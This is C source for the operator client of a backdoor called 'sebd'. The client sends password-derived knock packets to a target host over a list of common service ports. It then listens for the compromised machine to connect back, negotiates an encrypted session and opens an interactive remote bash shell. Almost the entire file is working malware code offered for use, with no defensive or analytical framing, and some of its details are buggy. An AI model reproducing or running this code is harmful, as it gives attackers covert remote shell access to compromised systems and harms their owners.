/* client.c - a simple client for the sebd backdoor */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <termios.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <netdb.h>

#include "../include/config.h"
#include "../include/func.h"
#include "../include/pel.h"

#define RUNSHELL 3

static int services[] = {21, 22, 23, 25, 53, 80, 110, 143, 3306, 0};
unsigned char message[BUFSIZE + 1];
int to = 0;

void timeout(int n)
{
    to = 1;
    alarm(0);
}
		                                                                                                                              
void set_timeout(int n)
{
    to = 0;
    alarm(n);
    signal(SIGALRM, timeout);
}

void child_died(int n)
{
    exit(1);
}
	

void child_wait(int n)
{
    wait(NULL);
}
	

int accept_from_server(int child, int sock, char *key)
{
    int ret, server, n;
    struct sockaddr_in server_addr;
    char action, password[14];
    
    action = RUNSHELL;
    
    signal(SIGCHLD, child_died);
    
    n = sizeof( server_addr );
    server = accept( sock, (struct sockaddr *) &server_addr, &n );
    if( server < 0 ) {
	perror( "accept" );
	return 5;
    }
    
    signal(SIGCHLD, child_wait);
    kill(child, SIGTERM);
    
    fprintf(stderr, "\n[client]-> GOT CONNECTION\n");
    fprintf(stderr, "[server]-> negotiating key...");
    
    close(sock);
    
    snprintf(password, (sizeof(key) + 14), "%s", key);
    ret = pel_client_init( server, password);
    fprintf(stderr, "OK\n");
    memset( password, 0, strlen( password ) );
    if( ret != PEL_SUCCESS ) {
	fprintf( stderr, "FAILED\n" );
	shutdown( server, 2 );
	return 6;
    }
    fprintf(stderr, "[server]-> setting up encryption...DONE\n");
    fprintf(stderr, "[server]-> have a nice bash !!!\n");
    ret = pel_send_msg( server, (unsigned char *) &action, 1 );
    if( ret != PEL_SUCCESS )
    {
	pel_error( "pel_send_msg" );
	shutdown( server, 2 );
	return 7;
    }
    
    client_runshell(server, "exec bash -i");
	                                                                                                                              
    shutdown( server, 2 );
	                                                                                                                                  
    /* never reached */
    return 0;
}

int client_runshell(int server, char *command)
{
    fd_set rd;
    char *term;
    int ret, len, imf;
    struct winsize ws;
    struct termios tp, tr;

    term = getenv( "TERM" );
    if( term == NULL )
    {
	term = "vt100";
    }

    len = strlen( term );
    ret = pel_send_msg( server, (unsigned char *) term, len );
    if( ret != PEL_SUCCESS )
    {
	pel_error( "pel_send_msg" );
	return 1;
    }

    imf = 0;
    if( isatty( 0 ) )
    {
	imf = 1;
	if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 )
	{
	    perror( "ioctl(TIOCGWINSZ)" );
	    return 2;
	}
    }
    else
    {
	ws.ws_row = 25;
	ws.ws_col = 80;
    }

    message[0] = ( ws.ws_row >> 8 ) & 0xFF;
    message[1] = ( ws.ws_row      ) & 0xFF;
    message[2] = ( ws.ws_col >> 8 ) & 0xFF;
    message[3] = ( ws.ws_col      ) & 0xFF;
    ret = pel_send_msg( server, message, 4 );
    if( ret != PEL_SUCCESS )
    {
	pel_error( "pel_send_msg" );
	return 3;
    }

    len = strlen(command);
    ret = pel_send_msg( server, (unsigned char *) command, len );
    if( ret != PEL_SUCCESS )
    {
	pel_error( "pel_send_msg" );
	return 4;
    }
    
    if( isatty( 1 ) )
    {
	if( tcgetattr( 1, &tp ) < 0 )
	{
	    perror( "tcgetattr" );
	    return 5;
	}
	
	memcpy( (void *) &tr, (void *) &tp, sizeof( tr ) );
	tr.c_iflag |= IGNPAR;
	tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
	tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
	tr.c_oflag &= ~OPOST;
	tr.c_cc[VMIN]  = 1;
	tr.c_cc[VTIME] = 0;
	
	if( tcsetattr( 1, TCSADRAIN, &tr ) < 0 )
	{
	    perror( "tcsetattr" );
	    return 6;
	}
    }												

    while( 1 )
    {
	FD_ZERO( &rd );
	
	if( imf != 0 )
	{
	    FD_SET( 0, &rd );
	}
	
	FD_SET( server, &rd );
	
	if( select( server + 1, &rd, NULL, NULL, NULL ) < 0 )
	{
	    perror( "select" );
	    ret = 7;
	    break;
	}
	if( FD_ISSET( server, &rd ) )
	{
	    ret = pel_recv_msg( server, message, &len );
	    if( ret != PEL_SUCCESS )
	    {
		if( pel_errno == PEL_CONN_CLOSED )
		{
		    ret = 0;
		}
		else
		{
		    pel_error( "pel_recv_msg" );
		    ret = 8;
		}
		break;
	    }
	    
	    if( write( 1, message, len ) != len )
	    {
		perror( "write" );
		ret = 9;
		break;
	    }
	}
	
	if( imf != 0 && FD_ISSET( 0, &rd ) )
	{
	    len = read( 0, message, BUFSIZE );
	    if( len == 0 )
	    {
		fprintf( stderr, "stdin: end-of-file\n" );
		ret = 10;
		break;
	    }
	    if( len < 0 )
	    {
		perror( "read" );
		ret = 11;
		break;
	    }
																					 																											      
	    ret = pel_send_msg( server, message, len );
	    if( ret != PEL_SUCCESS )
	    {
		pel_error( "pel_send_msg" );
		ret = 12;
		break;
	    }
	}
    }

    if( isatty( 1 ) )
    {
	tcsetattr( 1, TCSADRAIN, &tp );
    }
			                                                                                                                              
    return( ret );
}

void pel_error( char *s )
{
    switch( pel_errno )
    {
	case PEL_CONN_CLOSED:
	    fprintf( stderr, "%s: Connection closed.\n", s );
	    break;
	
	case PEL_SYSTEM_ERROR:
	    perror( s );
	    break;
				                                                                                                                               
	case PEL_WRONG_CHALLENGE:
	    fprintf( stderr, "%s: Wrong challenge.\n", s );
	    break;
								                                                                                                                               
	case PEL_BAD_MSG_LENGTH:
	    fprintf( stderr, "%s: Bad message length.\n", s );
	    break;
												                                                                                                                               
	case PEL_CORRUPTED_DATA:
	    fprintf( stderr, "%s: Corrupted data.\n", s );
	    break;
						 			 	
	case PEL_UNDEFINED_ERROR:
	    fprintf( stderr, "%s: No error.\n", s );
	    break;
	    
	default:
	    fprintf( stderr, "%s: Unknown error code.\n", s );
	    break;
    }
}
					        
int send_packet(char key[14], unsigned long int ip, int port)
{
    int sock, connector, client, ret, n, pid;
    struct sockaddr_in sender;
    struct sockaddr_in client_addr;
    int c = 30;
    int t = 20;
    
    client = socket( AF_INET, SOCK_STREAM, 0 );
    if( client < 0 ) {
	perror( "socket" );
	return 1;
    }
    
    n = 1;
    ret = setsockopt( client, SOL_SOCKET, SO_REUSEADDR, (void *) &n, sizeof( n ) );
    if( ret < 0 ) {
	perror( "setsockopt" );
	return 2;
    }
    
    client_addr.sin_family      = AF_INET;
    client_addr.sin_port        = htons( SERVER_PORT );
    client_addr.sin_addr.s_addr = INADDR_ANY;
    
    ret = bind( client, (struct sockaddr *) &client_addr, sizeof( client_addr ) );
    if( ret < 0 ) {
	perror( "bind" );
	return 3;
    }

    if( listen( client, 5 ) < 0 ) {
	perror( "listen" );
	return 4;
    }

    fprintf(stderr, "[client]-> listening on port: %d\n", SERVER_PORT);
    
    pid = fork();
    if (pid < 0) {
	perror("fork");
	return 5;
    }
    
    if(pid !=  0) {
	return accept_from_server(pid, client, key);
    }
    close(client);							      									     	    							    

    for(port = 0; services[port]; port++) {
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(sock < 0) {
	    perror("socket");
	    return 1;
	}
	
	bzero(&sender, sizeof(sender));
	sender.sin_family = AF_INET;
	sender.sin_port = htons(services[port]);
	sender.sin_addr.s_addr = ip;
	
	fprintf(stderr, "[client]-> sending packet to %s on port %d\n", inet_ntoa(ip), services[port]);
	
	set_timeout(c);
	
	connector = connect(sock, (struct sockaddr *) &sender, sizeof(sender));
	if(to) {
	    fprintf(stderr, "connect: timed out");
	    continue;
	}
	if(connector < 0) {
	    perror("connect");
	    continue;
	}
	
	fprintf(stderr, "[client]-> sending");
	
	set_timeout(t);
	
	while(!to) {
	    if(write(sock, key, (sizeof(key)+10)) < 0) {
		break;
	    }
	    sleep(2);
	    fprintf(stderr, " . ");
	    fflush(stderr);
	}
	fprintf(stderr, "\n[client]-> no response from %s in %d seconds\n", inet_ntoa(ip), t);
	close(sock);
    }
    
    fprintf(stderr, "[client]-> server (%s) not responding...giving up!\n", inet_ntoa(ip));
    
    return 1;
}
     
int main(int argc, char *argv[])
{
    unsigned char *h = NULL;
    int d = 0;
    unsigned long int ip;
    struct  termios old, new;
    char password[256];
    char key[14];
    int option;
    
    while((option = getopt(argc, argv, "h:H:d:D")) != EOF) {
	if(!optarg)
	    return usage(argv[0]);
    	switch(option & 0xdf) {
	    case 'H':
		h = optarg;
		break;
	    case 'D':
		if (sscanf(optarg, "%u\n", &d) != 1) {
		    return usage(argv[0]);
		}		
		break;
	    default:
		usage(argv[0]);
	}
    }
    
    if((!h) || (d > 65535)) {
	return usage(argv[0]);											
    }
    if (d) {
	services[0] = d;
	services[1] = 0;
    }

    tcgetattr(0, &old);
    new = old;
    new.c_lflag &= ~(ICANON | ECHO | ISIG);
    new.c_iflag &= ~(IXON | IXOFF);
			                                                                                                                                  
    tcsetattr(0, TCSAFLUSH, &new);
    fprintf(stderr, "[client]-> enter password: ");
    fflush(stderr);
    fgets(password, 256, stdin);
    tcsetattr(0, TCSAFLUSH, &old);
    
    printf("\n");						                                                                                                                              
    snprintf(key, 14, (char *) crypt(password, SALT));
    
    ip = resolve(argv[2]);
    
    send_packet(key, ip, option);
    
    return 0;
}	

int usage(char *program)
{
    fprintf(stderr, "usage: %s [hd] ...args\n"
	            "     -h : the host or ip where the server is running\n"
		    "     -d : the port where to send the packet\n",
		    program);
    exit(1);
    /* never reached */
    return 0;    
}

unsigned long int resolve(char *hostname)
{
    struct hostent *host;
    struct sockaddr_in server_host;
    
    bzero((char *) &server_host, sizeof(server_host));
    
    host = gethostbyname(hostname);
    if(host == NULL) {
	perror("gethostbyname");
	return 1;
    }

    memset((char *) &server_host, 0, sizeof(server_host));
    memcpy((char *) &server_host.sin_addr, host->h_addr, host->h_length);
					                                                                                                                              
    return (server_host.sin_addr.s_addr);
}

